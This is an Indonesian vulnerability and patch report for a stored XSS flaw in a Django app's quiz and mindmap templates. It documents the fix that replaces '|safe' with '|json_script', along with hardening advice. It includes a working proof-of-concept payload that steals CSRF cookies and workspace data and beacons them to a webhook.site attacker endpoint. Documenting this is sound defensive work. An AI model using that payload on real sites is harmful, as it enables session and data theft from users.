# Dokumentasi Mitigasi: Stored Cross-Site Scripting (XSS)

> **Tanggal Ditemukan:** 2026-06-07
> **Tanggal Dipatch:** 2026-06-07
> **Severity:** HIGH
> **Status:** PATCHED 
> **Versi Patch:** 1.2.70

---

## Ringkasan Kerentanan

Aplikasi MythosNote memiliki kerentanan **Stored Cross-Site Scripting (XSS)** pada dua halaman:
- `/workspace/quiz/<job_id>/`
- `/workspace/mindmap/<job_id>/`

Kerentanan disebabkan oleh penggunaan filter Django `|safe` pada template HTML untuk menyisipkan nilai `job.result` dari database ke dalam blok `<script>`. Filter `|safe` menonaktifkan mekanisme escaping bawaan Django, sehingga konten berbahaya dari database dapat langsung dieksekusi sebagai JavaScript di browser pengguna.

---

## Analisis Root Cause

### Kode Rentan (Sebelum Patch)

**`templates/generate/quiz.html` baris 80-83:**
```html
<!-- Invisible data store for JS -->
<script type="application/json" id="quiz-data">
    {{ job.result|safe }}
</script>
```

**`templates/generate/mindmap.html` baris 60-63:**
```html
<!-- Invisible data store for JS -->
<script type="application/json" id="mindmap-data">
    {{ job.result|safe }}
</script>
```

Masalah inti: `job.result` adalah string JSON yang disimpan di kolom `TextField` model `GenerateJob`. Nilai ini tidak divalidasi terhadap tag HTML saat disimpan. Filter `|safe` mencegah Django melakukan escaping pada karakter `<`, `>`, `&`, sehingga string seperti:

```
</script><script>alert('XSS')</script><!--
```

...akan langsung di-render sebagai HTML yang valid dan dieksekusi browser.

---

## Bukti Eksploitasi (PoC Terkonfirmasi)

### Metode Serangan: Injeksi Langsung ke Database
Karena LLM tidak memindahkan payload secara verbatim, serangan berhasil melalui bypass LLM dengan injeksi langsung ke Django shell.

**Payload yang digunakan (mindmap):**
```json
{
  "name": "</script><script>(function(){
    /* Ambil CSRF token & workspace ID dari DOM */
    var c = document.cookie.match(/csrftoken=([^;]+)/);
    var w = document.body.innerHTML.match(/workspace_id=([a-f0-9-]{36})/i);
    var ws = w ? w[1] : null;
    var h = {'Accept': 'application/json'};
    if (c) h['X-CSRFToken'] = c[1];

    /* Eksfiltrasi data ke server penyerang */
    Promise.all([
      fetch('/api/sources/?workspace_id=' + ws, {credentials: 'include', headers: h}).then(r => r.json()),
      fetch('/api/workspace/' + ws + '/generate/', {credentials: 'include', headers: h}).then(r => r.json())
    ]).then(function(d) {
      var x = {
        attack: 'E2E-STORED-XSS',
        host: location.hostname,
        workspace: ws,
        sources: d[0],
        generate_jobs: d[1],
        cookies: document.cookie.slice(0, 120)
      };
      navigator.sendBeacon('https://webhook.site/[ATTACKER_ENDPOINT]', JSON.stringify(x));
    });
  })();</script><!--",
  "children": [...]
}
```

### Dampak yang Terbukti (Dari `security/bukti/webhook.json`)
Data berikut berhasil diekstrak dari sesi korban:
- ✅ CSRF Token: `csrftoken=JryIzts...`
- ✅ Workspace ID: `af5b701e-a74b-431e-9c7a-1638c9feddaa`
- ✅ Daftar sumber dokumen (Source IDs, nama file, status)
- ✅ Daftar Generate Jobs (ID, action, hasil)
/


---

## Solusi yang Diterapkan (Patch)

### Perubahan Kode

**`templates/generate/quiz.html` — Sebelum:**
```html
<script type="application/json" id="quiz-data">
    {{ job.result|safe }}
</script>
```

**`templates/generate/quiz.html` — Sesudah:**
```html
{{ job.result|json_script:"quiz-data" }}
```

---

**`templates/generate/mindmap.html` — Sebelum:**
```html
<script type="application/json" id="mindmap-data">
    {{ job.result|safe }}
</script>
```

**`templates/generate/mindmap.html` — Sesudah:**
```html
{{ job.result|json_script:"mindmap-data" }}
```

### Mengapa `|json_script` Aman?

Filter `|json_script` bawaan Django melakukan hal berikut secara otomatis:
1. Merender tag `<script type="application/json" id="...">` 
2. Melakukan HTML-escaping pada karakter kritis: `<` → `\u003c`, `>` → `\u003e`, `&` → `\u0026`

Sehingga payload berbahaya:
```
</script><script>alert(1)</script>
```
Dirender menjadi:
```
\u003c/script\u003e\u003cscript\u003ealert(1)\u003c/script\u003e
```

Browser tidak akan menginterpretasikan output ini sebagai HTML tag, melainkan sebagai string JSON biasa.

### Kompatibilitas Frontend

JavaScript di `quiz.js` dan `mindmap.js` mengakses data menggunakan:
```js
const dataNode = document.getElementById("quiz-data");
let rawData = dataNode.textContent.trim();
quizData = JSON.parse(rawData);
```

`|json_script` menghasilkan tag dengan ID dan tipe yang sama dengan kode asli — tidak ada perubahan diperlukan di sisi JavaScript. Browser secara otomatis men-*decode* karakter yang di-escape (`\u003c` → `<`) saat dibaca via `.textContent`, sehingga `JSON.parse()` tetap bekerja dengan benar.

---

## Verifikasi Patch

Untuk memverifikasi bahwa patch telah bekerja, ulangi metode eksploitasi:

1. Inject payload ke DB via Django shell (sama seperti sebelumnya).
2. Buka halaman quiz/mindmap yang terinjeksi.
3. **Expected result setelah patch:** Tidak ada alert/eksekusi script. Browser menampilkan halaman normal atau error parsing JSON (karena payload bukan JSON valid).
4. Inspect source HTML — lihat bahwa karakter `<` dan `>` sudah di-encode sebagai `\u003c` dan `\u003e`.

---

## Rekomendasi Tambahan (Hardening Lanjutan)

Meskipun patch ini menutup vektor XSS utama, berikut adalah rekomendasi pengamanan lanjutan:

| # | Rekomendasi | Priority |
|---|---|---|
| 1 | Tambahkan **Content-Security-Policy (CSP)** header yang melarang `unsafe-inline` scripts. Ini mencegah eksekusi script inline bahkan jika XSS lain ditemukan. | HIGH |
| 2 | Audit semua template lain yang menggunakan filter `\|safe` — pastikan tidak ada data dari DB/user yang di-render tanpa escaping. | HIGH |
| 3 | Tambah **validasi output LLM** di layer `process_output()` (`apps/generate/processors.py`) untuk mendeteksi dan menolak string yang mengandung tag HTML (`<script>`, `</script>`, `<img onerror=...>`, dll.) sebelum disimpan ke DB. | MEDIUM |
| 4 | Set header **`X-XSS-Protection: 1; mode=block`** (defense-in-depth untuk browser lama). | LOW |
| 5 | Pertimbangkan penerapan **SubResource Integrity (SRI)** untuk script eksternal (seperti `html-to-image.min.js` dari cdnjs). | LOW |
